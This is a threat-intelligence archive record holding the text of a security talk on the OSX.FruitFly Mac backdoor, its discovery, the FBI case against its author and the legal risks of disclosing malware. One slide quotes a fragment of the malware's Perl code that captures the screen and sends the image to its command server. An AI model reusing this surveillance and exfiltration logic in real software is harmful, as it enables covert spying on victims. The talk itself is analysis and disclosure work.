{
    "id": "2e8cdd48-201c-4cdd-9709-f2182df5e9b5",
    "created_at": "2022-10-25T16:48:12.067451Z",
    "updated_at": "2025-03-27T02:05:55.284514Z",
    "deleted_at": null,
    "sha1_hash": "7b4ff38f537d1d4d0688a0b677da6bbedcbc63fa",
    "title": "FruitFly_ObtS",
    "authors": "",
    "file_creation_date": "2020-03-13T20:16:01Z",
    "file_modification_date": "2020-03-13T20:16:01Z",
    "file_size": 2111037,
    "plain_text": "## The case of the fly on the wall\n\n#### ...and the legal issues of disclosing malware\n\n\n-----\n\n#### % whoami\n\n Thomas Reed\n\n @thomasareed\n\n treed@malwarebytes.com\n\n\n-----\n\n## OSX.FruitFly\n\n#### â€¢\n### All-purpose, extremely unique, backdoor\n\n#### â€¢\n### Perl script, containing \"helpers\":\n\n#### â€¢\n### Mach-O binary\n\n#### â€¢\n### Java class\n\n#### â€¢\n### Another Perl script\n\n\n-----\n\n## First-stage Perl\n\n#### â€¢\n### Communicates with C&C\n\n#### â€¢\n### Executes commands (with assist from helpers)\n\n#### â€¢\n### Exfiltrates data\n\n\n-----\n\n## First-stage Perl\n\n###### for (my$n;; sleep $n) {\n\n##### Loop every 10 seconds\n\n######  $n = 10;  ...   for (;;) {\n\n##### Read one byte from C&C socket\n\n######    my$s = ord B 1;    if ($s == 0) {}\n\n##### If byte (command) is 2...\n\n######    elsif($s == 2) {     ...     elsif(!system(($m ? 'screencapture -x' : 'xwd -silent -root '.       '-display :0.0 | convert xwd:-').      ' /tmp/scrn.png')) {      my$v = N('/tmp/scrn.png');\n\n##### Capture screen to /tmp/scrn.png\n\n######      unlink '/tmp/scrn.png';      if (defined$v) {\n\n##### Read image into memory\n\n######       A \"\\2\".K($v)      }\n\n##### Write image to C&C socket\n\n\n-----\n\n## More details...\n\n#### â€¢\n### Offensive Malware Analysis: Dissecting OSX/\n FruitFly.b via a Custom C&C Server\n\n#### â€¢\n### https://www.virusbulletin.com/uploads/pdf/\n magazine/2017/VB2017-Wardle.pdf\n\n\n-----\n\n## Discovery of FruitFly\n\n##### Case Western Reserve University (CWRU)\n### Jan. 4, 2017\n\n##### â€¢Notified of infection\n â€¢100+ more systems found infected\n\n FBI contacted\n### Jan. 5, 2017\n\n##### Suspect identified\n### Jan. 6, 2017\n\n##### â€¢Computers compromised for several years\n â€¢IP address used by malware had been used\n to access alumni e-mail account\n â€¢Phillip Roman Durachinsky becomes\n suspect\n\n\n-----\n\n##### \"I found this hidden .client file at the root of a\n### Jan. 10, 2017\n##### user directory on a client that security reported was making peculiar outbound traffic.\"\n\n FruitFly discovery released\n\n### Jan. 18, 2017\n\n##### â€¢Malwarebytes blog\n (10 am EST)\n\n â€¢MRT update\n\n\n-----\n\n##### FBI raid!\n\n### Jan. 18, 2017\n\n##### â€¢Durachinsky's parents\n (10 pm EST)\n\n â€¢Allowed to enter\n â€¢Told that Durachinsky had been in trouble\n for hacking in high school\n â€¢Confiscated laptop that was on and being\n remotely controlled\n â€¢Also found numerous hard drives\n\n â€¢Timing due to data deletion concerns!\n\n# ðŸ¤¦\n\n\n-----\n\n##### Warrant signed to access data\n\n### Jan 19, 2017\n\n##### â€¢20 million collected files\n (4:40 am EST)\n\n â€¢Thousands of victims\n â€¢Child pornography\n\n Durachinsky arrested\n### Jan 25, 2017\n\n\n-----\n\n### Mar. 27, 2017 [FBI issues a FLASH with malware details]\n\n##### Mar. 4, 2020\n\n###### https://reverse.put.as/2020/03/04/a-fruitfly-dropper-and-the-missing-tricks/\n\n\n-----\n\n##### Durachinsky indicted on 16 counts\n### Jan. 10, 2018\n\n##### â€¢Damaging Protected Computers\n â€¢Accessing Protected Computers\n â€¢Production of Child Pornography\n â€¢Wire Fraud (x3)\n â€¢Aggravated Identity Theft (x4)\n â€¢Accessing Government Computer Without\n Authorization\n â€¢Illegal Wiretap (x5)\n\n\n-----\n\n### Apr. 28, 2019 [Defense files motion to suppress evidence]\n\n##### â€¢Claiming improper seizure\n â€¢Requesting suppression of:\n\n â€¢Evidence obtained from laptop\n â€¢Confession\n\n### May 13, 2019 [Prosecution responds]\n\n\n-----\n\n##### Debate continues after multiple hearings\n### Today\n\n\n-----\n\n## What's the takeaway?\n\n#### â€¢\n### Malware disclosure is important for victims\n\n#### â€¢\n### Malware disclosure can interfere with legal process\n\n#### â€¢\n### Be mindful when disclosing\n\n#### â€¢\n### Consider engaging with law enforcement\n\n#### â€¢\n### eg, local office, InfraGard (FBI), etc\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://objectivebythesea.com/v3/talks/OBTS_v3_tReed.pdf"
    ],
    "report_names": [
        "OBTS_v3_tReed.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1666716492,
    "ts_updated_at": 1743041155,
    "ts_creation_date": 1584130561,
    "ts_modification_date": 1584130561,
    "files": {
        "pdf": "https://archive.orkl.eu/7b4ff38f537d1d4d0688a0b677da6bbedcbc63fa.pdf",
        "text": "https://archive.orkl.eu/7b4ff38f537d1d4d0688a0b677da6bbedcbc63fa.txt",
        "img": "https://archive.orkl.eu/7b4ff38f537d1d4d0688a0b677da6bbedcbc63fa.jpg"
    }
}